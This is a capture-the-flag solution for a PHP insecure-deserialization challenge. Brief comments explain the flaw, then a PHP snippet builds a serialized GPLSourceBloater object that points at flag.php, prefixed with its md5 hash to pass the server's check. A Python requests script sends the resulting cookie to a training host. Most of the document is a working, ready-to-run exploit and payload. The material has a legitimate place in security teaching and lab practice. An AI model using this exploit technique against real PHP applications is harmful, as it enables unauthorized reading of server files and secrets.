#The unserialize is easy to spot. There is only a class and it contains the __toString() method which is vulnerable and it is called immediatly after the unserialize.
#The method uses a parameter called source which we can set in the class.
#The data sent through the form are not evaluated correctly hence we need to craft a cookie value directly.
#Cookies need to be urlencoded so we use urlencode.
#Then we create the value using md5 in order to bypass the check that the server does.
#The resulting value for the cookie is: 760463360e4919ca238d1566fc26661fa%3A1%3A%7Bi%3A0%3BO%3A16%3A%22GPLSourceBloater%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D
#Just send the cookie with a get and you got the flag

"""
<?php
Class GPLSourceBloater{
	public $source = "flag.php";
}


$ser = serialize(array(new GPLSourceBloater));
echo $ser . "<br>";

$md = md5($ser);
echo $md . "<br>";

echo urlencode($md . $ser). "<br>";

if(md5($ser) === $md){
	echo "k". "<br>";
}
?>
"""

#The following scripts automate the sending of the cookie
import requests
import urllib.parse

'''


--------> $serialized = a:1:{i:0;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}
--------> $md5_encoded = 760463360e4919ca238d1566fc26661f
--------> cookie = $md5_encoded . $serialized
'''

def main():
    url = "http://free.training.jinblack.it/"

    ser = 'a:1:{i:0;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}'
    md = '760463360e4919ca238d1566fc26661f'

    cookieName = 'todos'
    cookieContent = urllib.parse.quote(md + ser)

    r = requests.post(url, cookies = { cookieName : cookieContent })

    print(r.text)

main()